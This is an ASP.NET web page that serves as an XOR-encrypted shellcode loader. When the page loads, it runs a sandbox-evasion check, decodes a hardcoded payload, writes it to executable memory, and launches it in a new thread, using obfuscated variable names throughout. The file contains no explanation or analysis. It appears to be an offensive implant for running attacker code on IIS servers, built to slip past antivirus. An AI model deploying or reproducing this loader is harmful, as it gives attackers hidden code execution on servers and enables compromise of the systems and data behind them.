<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

	[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true,ExactSpelling = true)]
	private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

	[System.Runtime.InteropServices.DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
		if(mem == null)
		{
		return;
		}
		
		byte[] jeDzTq78iZo = new byte[] {0x57,0x85,0x6C,0xD6,0x5B,0x25,0x23,0x32,0xAB,0xCD,0xAE,0x63,0xEA,0x9D,0xBD,0x63,0xE3,0xFC,0x3D,0x57,0xE3,0x46,0xBD,0x52,0xE3,0x46,0xBD,0x2A,0xFD,0x85,0x64,0x60,0x8B,0x85,0x64,0x40,0xFB,0x85,0xE0,0x85,0xE1,0x87,0xA2,0x03,0x62,0x85,0xDE,0xF2,0x07,0xF1,0x8E,0x4E,0xA9,0xE1,0xCF,0x73,0x6A,0x04,0xE2,0x73,0xAA,0x0C,0x0D,0xDF,0xF9,0x8C,0xBE,0x7A,0x20,0x9F,0xCF,0xB9,0xE9,0xF1,0xA7,0x33,0x7B,0xAB,0x6E,0x4A,0xB3,0xC6,0xED,0x3D,0x2E,0xBF,0xEF,0x32,0xAB,0x46,0x6F,0xBA,0xAB,0xCD,0xEF,0x7A,0x2E,0x0D,0x9B,0x55,0xE3,0xCC,0x3F,0x62,0x20,0x85,0xF7,0x76,0x20,0x8D,0xCF,0x7B,0xAA,0x1D,0x0C,0x64,0xE3,0x32,0x26,0x73,0x20,0xF9,0x67,0x7A,0xAA,0x1B,0xA2,0x03,0x62,0x85,0xDE,0xF2,0xEA,0x0C,0x26,0x3F,0x07,0x8C,0xEE,0xF3,0x93,0x2D,0x9A,0xC3,0xE7,0xCE,0xA3,0x16,0xA3,0x88,0xD6,0xE3,0xDE,0x15,0xB7,0x76,0x20,0x8D,0xCB,0x7B,0xAA,0x1D,0x89,0x73,0x20,0xC1,0xA7,0x76,0x20,0x8D,0xF3,0x7B,0xAA,0x1D,0xAE,0xB9,0xAF,0x45,0xAE,0x6A,0xEA,0x95,0xB1,0x6B,0xE3,0xCC,0x3F,0x68,0xEA,0x95,0xAE,0x6B,0xEA,0x97,0xA7,0xB1,0x47,0xED,0xAE,0x60,0x54,0x2D,0xB7,0x73,0xF2,0x97,0xA7,0xB9,0xB9,0x24,0xA4,0xCD,0x54,0x32,0xB2,0x7A,0x9A,0x16,0xBC,0x7B,0x15,0xBA,0x86,0x5C,0xC2,0xA3,0x8A,0x46,0xAB,0x8C,0xB9,0x7A,0x22,0x2C,0xA6,0xF5,0x69,0x81,0x98,0x14,0xAC,0x32,0x3A,0x61,0xF8,0x85,0x66,0xD3,0xF8,0x97,0xA2,0x03,0x6B,0x80,0xDE,0xFB,0xF8,0x9E,0xA6,0x88,0x91,0x9B,0x96,0x95,0xAB,0xCD,0xEF,0x32,0x54,0x18,0x07,0x3D,0xAB,0xCD,0xEF,0x03,0x92,0xFF,0xC1,0x03,0x9D,0xF5,0xC1,0x06,0x9E,0xE3,0xDD,0x03,0x9E,0xCD,0xB5,0x7A,0x22,0x0C,0xA6,0xF5,0x6B,0x76,0xEE,0x32,0xAB,0x80,0xDE,0xFB,0xF8,0x9E,0x85,0x31,0xF8,0x84,0x55,0x65,0x22,0x52,0x29,0x32,0xAB,0xCD,0xEF,0xCD,0x7E,0x25,0xD6,0x32,0xAB,0xCD,0xC0,0x5A,0xF3,0xA9,0xBD,0x47,0xE7,0x9A,0xAD,0x55,0xEE,0xBB,0xC2,0x51,0xDD,0xF4,0x98,0x5F,0x93,0x9B,0x98,0x58,0xDC,0x89,0xB6,0x03,0x98,0xAC,0x83,0x63,0xFC,0xBB,0xA4,0x5D,0xD8,0x99,0xBD,0x7B,0xD9,0xE0,0xBD,0x65,0xE3,0xF8,0x86,0x5C,0xD2,0xB5,0xA8,0x61,0xC9,0xB5,0xA2,0x54,0xED,0x92,0xEF,0x7A,0x22,0x0C,0xBC,0x68,0xEA,0x95,0xA2,0x03,0x62,0x9E,0xA7,0x8A,0xAB,0xFF,0x47,0xB6,0xAB,0xCD,0xEF,0x32,0xFB,0x9E,0xBC,0x7B,0x6C,0x0F,0x04,0x67,0x85,0xF6,0x10,0xE7,0xE3,0x44,0x29,0x58,0xA1,0x92,0xA7,0xBB,0x5A,0xA7,0xF0,0x68,0xF9,0xA5,0x6F,0x01,0xAB,0xCD,0xA6,0xBB,0x4B,0xA7,0xEB,0x73,0xF2,0x84,0x55,0x47,0xED,0x53,0x69,0x32,0xAB,0xCD,0xEF,0xCD,0x7E,0x80,0xDE,0xF2,0xF8,0x97,0xA7,0xBB,0x5A,0x80,0xDE,0xFB,0xE6,0xFC,0x26,0x61,0xF8,0x84,0x28,0xF0,0x86,0xCB,0xF7,0x49,0x54,0x18,0x6A,0xF2,0xDE,0xD2,0xA7,0xF5,0x6A,0x45,0xFC,0x32,0xAB,0x84,0x55,0x76,0x5B,0xF8,0x0F,0x32,0xAB,0xCD,0xEF,0xCD,0x7E,0x85,0x10,0xFD,0xDF,0xCF,0x04,0x98,0x43,0x98,0xEF,0x32,0xAB,0x9E,0xB6,0x58,0xEB,0x97,0xA6,0xBB,0x7A,0x0C,0x0D,0x22,0xE2,0x0A,0x2F,0x32,0xBB,0xCD,0xEF,0x7B,0x11,0x95,0x4B,0x61,0x4E,0xCD,0xEF,0x32,0xAB,0x32,0x3A,0x7A,0x38,0x9E,0xBC,0x7A,0x22,0x2A,0xA7,0xBB,0x5A,0x85,0x66,0xE8,0xE2,0x0A,0x2F,0x32,0x8B,0xCD,0xEF,0x7B,0x22,0x34,0xA6,0x88,0xB9,0x5B,0x66,0xD0,0xAB,0xCD,0xEF,0x32,0x54,0x18,0xA7,0xB1,0x6F,0xED,0x6A,0xF2,0xDF,0x7F,0x89,0xB9,0xAC,0x85,0xEE,0xF1,0x2E,0x0D,0x9A,0xE0,0xF3,0x0E,0xB7,0x58,0xAB,0x94,0xA6,0xF5,0x69,0x3D,0x5A,0x90,0xFD,0x32,0x3A};

		byte[] key = { 0xAB, 0xCD, 0xEF, 0x32 /* ... */ }; ;
		byte[] buf = xor(jeDzTq78iZo, key);

        IntPtr wYNpe = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(buf,0,wYNpe,buf.Length);
        IntPtr fXGX = IntPtr.Zero;
        IntPtr liijNUfbwDI = CreateThread(IntPtr.Zero,UIntPtr.Zero,wYNpe,IntPtr.Zero,0,ref fXGX);
    }
	
	private static byte[] xor(byte[] cipher, byte[] key)
	{
		byte[] xored = new byte[cipher.Length];
		for (int i = 0; i < cipher.Length; i++)
		{
			xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
		}
		return xored;
	}
</script>
